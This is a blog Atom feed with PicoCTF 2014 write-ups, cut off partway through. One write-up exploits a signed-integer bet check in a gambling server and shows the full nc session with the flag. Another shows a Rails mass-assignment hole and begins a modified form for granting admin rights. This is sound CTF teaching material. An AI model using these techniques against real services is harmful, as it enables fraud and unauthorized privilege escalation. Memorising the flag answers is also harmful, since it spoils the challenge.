<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2014-11-01T13:02:16+01:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Picoctf Writeups]]></title>
    <link href="http://barrebas.github.io/blog/2014/10/31/picoctf-writeups/"/>
    <updated>2014-10-31T11:39:31+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/10/31/picoctf-writeups</id>
    <content type="html"><![CDATA[<p>PicoCTF Writeups by @barrebas</p>

<!--more-->


<h1>Netsino (120 points)</h1>

<p><code>
Daedalus seems to have ties to a shady online gambling boss. Maybe if
you beat him at his own game, you can persuade him to share some useful
info. The server is running on vuln2014.picoctf.com:4547 and the source
code can be found here.
</code></p>

<p>We are presented with an online gambling program. You randomly get some cash and have to gamble against the boss. The following code takes your betsize:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">long</span> <span class="nf">getbet</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You&#39;ve got $%lu. How much you wanna bet on this next toss?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">player_cash</span><span class="p">);</span>
</span><span class='line'>        <span class="kt">long</span> <span class="n">bet</span> <span class="o">=</span> <span class="n">getnum</span><span class="p">();</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">bet</span> <span class="o">&lt;=</span> <span class="n">player_cash</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">return</span> <span class="n">bet</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Yerr can&#39;t bet more than ya got!&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The object is to win all the boss&#8217; money, so he&rsquo;ll give you the flag. Unfortunately, the program is coded pretty securely. Furthermore, the odds of winning aren&rsquo;t favorable. Luckily for us, the program makes a mistake when reading in the betsize. If we supply a large enough value, then the number being read will be negative. The program does not check for this. So let&rsquo;s supply <code>0xf0000000</code>, which is 4026531840. For the c program, however, it will be a negative number. Thus, the betsize check will pass, because -268435445 is less than your total amount. Next, all we have to do is lose:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">play</span><span class="p">(</span><span class="kt">long</span> <span class="n">choice</span><span class="p">,</span> <span class="kt">long</span> <span class="n">bet</span><span class="p">,</span> <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">y</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">switch</span><span class="p">(</span><span class="n">choice</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="c1">//...snip...</span>
</span><span class='line'>        <span class="k">case</span> <span class="mi">5</span><span class="o">:</span> <span class="k">if</span><span class="p">(</span><span class="n">x</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">y</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">player_cash</span> <span class="o">+=</span> <span class="mi">36</span><span class="o">*</span><span class="n">bet</span><span class="p">;</span>
</span><span class='line'>                <span class="n">boss_cash</span> <span class="o">-=</span> <span class="mi">36</span><span class="o">*</span><span class="n">bet</span><span class="p">;</span>
</span><span class='line'>                <span class="n">puts</span><span class="p">(</span><span class="n">wins</span><span class="p">[</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="mi">3</span><span class="o">+</span><span class="mi">7</span><span class="p">]);</span>
</span><span class='line'>            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">puts</span><span class="p">(</span><span class="n">loses</span><span class="p">[</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="mi">3</span><span class="o">+</span><span class="mi">7</span><span class="p">]);</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>By betting on snake-eyes (a very slim chance of that happening), the program will subtract the betsize times 36 from our cash and add that same amount to the boss&#8217; money. However, we supplied a very large negative number for the betsize, meaning that we actually <em>get</em> money and the boss loses money. Rinse &amp; repeat this a couple of times to get the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">bas</span><span class="err">@</span><span class="nl">tritonal</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">nc</span> <span class="n">vuln2014</span><span class="p">.</span><span class="n">picoctf</span><span class="p">.</span><span class="n">com</span> <span class="mi">4547</span>
</span><span class='line'><span class="n">Arr</span><span class="p">,</span> <span class="n">git</span> <span class="n">ye</span> <span class="n">into</span> <span class="n">me</span> <span class="n">casio</span><span class="p">,</span> <span class="n">the</span> <span class="n">hottest</span> <span class="n">gamblin</span><span class="err">&#39;</span> <span class="n">sensation</span> <span class="n">on</span> <span class="n">the</span> <span class="n">net</span><span class="o">!</span>
</span><span class='line'><span class="n">Here</span><span class="p">,</span> <span class="n">have</span> <span class="n">a</span> <span class="n">fiver</span><span class="p">,</span> <span class="n">and</span> <span class="n">let</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">gamble</span><span class="o">!</span>
</span><span class='line'><span class="n">You</span><span class="err">&#39;</span><span class="n">ve</span> <span class="n">got</span> <span class="err">$</span><span class="mf">5.</span> <span class="n">How</span> <span class="n">much</span> <span class="n">you</span> <span class="n">wanna</span> <span class="n">bet</span> <span class="n">on</span> <span class="n">this</span> <span class="n">next</span> <span class="n">toss</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">4026531840</span>
</span><span class='line'><span class="mi">1</span><span class="o">:</span> <span class="n">EVEN</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">4026531840</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">even</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span><span class="o">:</span> <span class="n">ODDS</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="k">if</span> <span class="n">both</span> <span class="n">dice</span> <span class="n">roll</span> <span class="n">odd</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span><span class="o">:</span> <span class="n">HIGH</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2952790016</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="mi">10</span> <span class="n">or</span> <span class="n">more</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span><span class="o">:</span> <span class="n">FOUR</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2147483648</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="n">four</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span><span class="o">:</span> <span class="n">EYES</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="n">on</span> <span class="n">snake</span> <span class="n">eyes</span><span class="p">.</span>
</span><span class='line'><span class="n">What</span><span class="err">&#39;</span><span class="n">ll</span> <span class="n">it</span> <span class="n">be</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">5</span>
</span><span class='line'><span class="n">Lets</span> <span class="n">rock</span> <span class="sc">&#39;n&#39;</span> <span class="n">roll</span><span class="o">!</span>
</span><span class='line'><span class="mi">5</span> <span class="mi">3</span>
</span><span class='line'><span class="n">Snake</span> <span class="n">eyes</span><span class="o">!</span> <span class="p">...</span><span class="n">not</span><span class="p">.</span>
</span><span class='line'><span class="n">You</span><span class="err">&#39;</span><span class="n">ve</span> <span class="n">got</span> <span class="err">$</span><span class="mf">268435461.</span> <span class="n">How</span> <span class="n">much</span> <span class="n">you</span> <span class="n">wanna</span> <span class="n">bet</span> <span class="n">on</span> <span class="n">this</span> <span class="n">next</span> <span class="n">toss</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">4026531840</span>
</span><span class='line'><span class="mi">1</span><span class="o">:</span> <span class="n">EVEN</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">4026531840</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">even</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span><span class="o">:</span> <span class="n">ODDS</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="k">if</span> <span class="n">both</span> <span class="n">dice</span> <span class="n">roll</span> <span class="n">odd</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span><span class="o">:</span> <span class="n">HIGH</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2952790016</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="mi">10</span> <span class="n">or</span> <span class="n">more</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span><span class="o">:</span> <span class="n">FOUR</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2147483648</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="n">four</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span><span class="o">:</span> <span class="n">EYES</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="n">on</span> <span class="n">snake</span> <span class="n">eyes</span><span class="p">.</span>
</span><span class='line'><span class="n">What</span><span class="err">&#39;</span><span class="n">ll</span> <span class="n">it</span> <span class="n">be</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">5</span>
</span><span class='line'><span class="n">Lets</span> <span class="n">rock</span> <span class="sc">&#39;n&#39;</span> <span class="n">roll</span><span class="o">!</span>
</span><span class='line'><span class="mi">5</span> <span class="mi">4</span>
</span><span class='line'><span class="n">You</span> <span class="n">seem</span> <span class="n">to</span> <span class="n">enjoy</span> <span class="n">loosing</span><span class="p">.</span>
</span><span class='line'><span class="n">You</span><span class="err">&#39;</span><span class="n">ve</span> <span class="n">got</span> <span class="err">$</span><span class="mf">536870917.</span> <span class="n">How</span> <span class="n">much</span> <span class="n">you</span> <span class="n">wanna</span> <span class="n">bet</span> <span class="n">on</span> <span class="n">this</span> <span class="n">next</span> <span class="n">toss</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">4026531840</span>
</span><span class='line'><span class="mi">1</span><span class="o">:</span> <span class="n">EVEN</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">4026531840</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">even</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span><span class="o">:</span> <span class="n">ODDS</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="k">if</span> <span class="n">both</span> <span class="n">dice</span> <span class="n">roll</span> <span class="n">odd</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span><span class="o">:</span> <span class="n">HIGH</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2952790016</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="mi">10</span> <span class="n">or</span> <span class="n">more</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span><span class="o">:</span> <span class="n">FOUR</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2147483648</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="n">four</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span><span class="o">:</span> <span class="n">EYES</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="n">on</span> <span class="n">snake</span> <span class="n">eyes</span><span class="p">.</span>
</span><span class='line'><span class="n">What</span><span class="err">&#39;</span><span class="n">ll</span> <span class="n">it</span> <span class="n">be</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">5</span>
</span><span class='line'><span class="n">Lets</span> <span class="n">rock</span> <span class="sc">&#39;n&#39;</span> <span class="n">roll</span><span class="o">!</span>
</span><span class='line'><span class="mi">2</span> <span class="mi">1</span>
</span><span class='line'><span class="n">Snake</span> <span class="n">eyes</span><span class="o">!</span> <span class="p">...</span><span class="n">not</span><span class="p">.</span>
</span><span class='line'><span class="n">You</span><span class="err">&#39;</span><span class="n">ve</span> <span class="n">got</span> <span class="err">$</span><span class="mf">805306373.</span> <span class="n">How</span> <span class="n">much</span> <span class="n">you</span> <span class="n">wanna</span> <span class="n">bet</span> <span class="n">on</span> <span class="n">this</span> <span class="n">next</span> <span class="n">toss</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">4026531840</span>
</span><span class='line'><span class="mi">1</span><span class="o">:</span> <span class="n">EVEN</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">4026531840</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">even</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span><span class="o">:</span> <span class="n">ODDS</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="k">if</span> <span class="n">both</span> <span class="n">dice</span> <span class="n">roll</span> <span class="n">odd</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span><span class="o">:</span> <span class="n">HIGH</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2952790016</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="mi">10</span> <span class="n">or</span> <span class="n">more</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span><span class="o">:</span> <span class="n">FOUR</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2147483648</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="n">four</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span><span class="o">:</span> <span class="n">EYES</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="n">on</span> <span class="n">snake</span> <span class="n">eyes</span><span class="p">.</span>
</span><span class='line'><span class="n">What</span><span class="err">&#39;</span><span class="n">ll</span> <span class="n">it</span> <span class="n">be</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">5</span>
</span><span class='line'><span class="n">Lets</span> <span class="n">rock</span> <span class="sc">&#39;n&#39;</span> <span class="n">roll</span><span class="o">!</span>
</span><span class='line'><span class="mi">4</span> <span class="mi">3</span>
</span><span class='line'><span class="n">Like</span> <span class="n">that</span> <span class="n">was</span> <span class="n">ever</span> <span class="n">gonna</span> <span class="n">happen</span><span class="p">.</span>
</span><span class='line'><span class="n">Great</span><span class="p">,</span> <span class="n">I</span><span class="err">&#39;</span><span class="n">m</span> <span class="n">fresh</span> <span class="n">outta</span> <span class="n">cash</span><span class="p">.</span> <span class="n">Take</span> <span class="n">this</span> <span class="n">flag</span> <span class="n">instead</span><span class="p">.</span>
</span><span class='line'><span class="n">i_wish_real_casinos_had_this_bug</span>
</span><span class='line'><span class="n">Git</span> <span class="n">outta</span> <span class="n">here</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<h1>Massive Fail (120 points)</h1>

<p><code>Fed up with their recent PHP related issues, Daedalus Corp. has switched their website to run on Ruby on Rails (version 3.1.0) instead. Their brand new registration page does not seem like much of an improvement though... [Source].</code></p>

<p>We&rsquo;re given the source to a Ruby on Rails website. We need to register as an admin to get the flag. The interesting bit is in <code>db/schema.rb</code> and <code>app/controller/user_controller.rb</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">ActiveRecord</span><span class="o">::</span><span class="n">Schema</span><span class="p">.</span><span class="n">define</span><span class="p">(</span><span class="o">:</span><span class="n">version</span> <span class="o">=&gt;</span> <span class="mi">20141008175655</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">create_table</span> <span class="s">&quot;users&quot;</span><span class="p">,</span> <span class="o">:</span><span class="n">force</span> <span class="o">=&gt;</span> <span class="nb">true</span> <span class="k">do</span> <span class="o">|</span><span class="n">t</span><span class="o">|</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">string</span>   <span class="s">&quot;username&quot;</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">string</span>   <span class="s">&quot;password&quot;</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">string</span>   <span class="s">&quot;name&quot;</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">boolean</span>  <span class="s">&quot;is_admin&quot;</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">datetime</span> <span class="s">&quot;created_at&quot;</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">datetime</span> <span class="s">&quot;updated_at&quot;</span>
</span><span class='line'>  <span class="n">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">class</span> <span class="n">UserController</span> <span class="o">&lt;</span> <span class="n">ApplicationController</span>
</span><span class='line'>  <span class="n">def</span> <span class="k">register</span>
</span><span class='line'>  <span class="n">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">def</span> <span class="n">create</span>
</span><span class='line'>    <span class="cp"># User.new creates a new user according to ALL the parameters</span>
</span><span class='line'>    <span class="err">@</span><span class="n">new_user</span> <span class="o">=</span> <span class="n">User</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="o">:</span><span class="n">user</span><span class="p">])</span>
</span><span class='line'>    <span class="err">@</span><span class="n">new_user</span><span class="p">.</span><span class="n">save</span>
</span><span class='line'>  <span class="n">end</span>
</span><span class='line'><span class="n">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>The application registers the user using <em>ALL</em> supplied parameters. So let&rsquo;s supply a few more, shall we? Download the registration page and &ldquo;tweak&rdquo; it a bit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;form</span> <span class="na">accept-charset=</span><span class="s">&quot;UTF-8&quot;</span> <span class="na">action=</span><span class="s">&quot;http://web2014.picoctf.com:5000/user/create&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span><span class="nt">&gt;&lt;div</span> <span class="na">style=</span><span class="s">&quot;margin:0;padding:0;display:inline&quot;</span><span class="nt">&gt;&lt;input</span> <span class="na">name=</span><span class="s">&quot;utf8&quot;</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">value=</span><span class="s">&quot;&amp;#x2713;&quot;</span> <span class="nt">/&gt;&lt;input</span> <span class="na">name=</span><span class="s">&quot;authenticity_token&quot;</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">value=</span><span class="s">&quot;+yYhUookKb5lZuf2bU97ccd3TWYizvaxFYpWfR5H/b8=&quot;</span> <span class="nt">/&gt;&lt;/div&gt;</span>
</span><span class='line'>  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;control-group&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;label</span> <span class="na">class=</span><span class="s">&quot;control-label&quot;</span> <span class="na">for=</span><span class="s">&quot;user_name&quot;</span><span class="nt">&gt;</span>Name<span class="nt">&lt;/label&gt;</span>:
</span><span class='line'>    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;controls&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">&quot;user_name&quot;</span> <span class="na">name=</span><span class="s">&quot;user[name]&quot;</span> <span class="na">size=</span><span class="s">&quot;30&quot;</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;control-group&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;label</span> <span class="na">class=</span><span class="s">&quot;control-label&quot;</span> <span class="na">for=</span><span class="s">&quot;user_username&quot;</span><span class="nt">&gt;</span>Username<span class="nt">&lt;/label&gt;</span>:
</span><span class='line'>    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;controls&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">&quot;user_username&quot;</span> <span class="na">name=</span><span class="s">&quot;user[username]&quot;</span> <span class="na">size=</span><span class="s">&quot;30&quot;</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;control-group&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;label</span> <span class="na">class=</span><span class="s">&quot;control-label&quot;</span> <span class="na">for=</span><span class="s">&quot;user_password&quot;</span><span class="nt">&gt;</span>Password<span class="nt">&lt;/label&gt;</span>:
</span><span class='line'>    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;controls&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">&quot;user_password&quot;</span> <span class="na">name=</span><span class="s">&quot;user[password]&quot;</span> <span class="na">size=</span><span class="s">&quot;30&quot;</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;control-group&quot;</span><span class="nt">&gt;</span>
